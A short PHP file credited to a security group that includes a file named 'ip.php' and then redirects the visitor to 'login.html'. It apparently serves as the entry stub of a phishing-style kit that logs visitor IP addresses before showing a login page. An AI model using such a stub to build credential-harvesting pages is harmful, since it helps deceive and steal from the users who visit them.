<?php
/**
 * Created by Abdal Security Group.
 * Programmer: Ebrahim Shafiei
 * Programmer WebSite: https://hackers.zone/
 * Programmer Email: Prof.Shafiei@Gmail.com
 * License : AGCL
 * Current Date : Sat 02/01/2020
 * Current Time : 01:37 AM
 */

include 'ip.php';
header('Location: login.html');
exit
?>
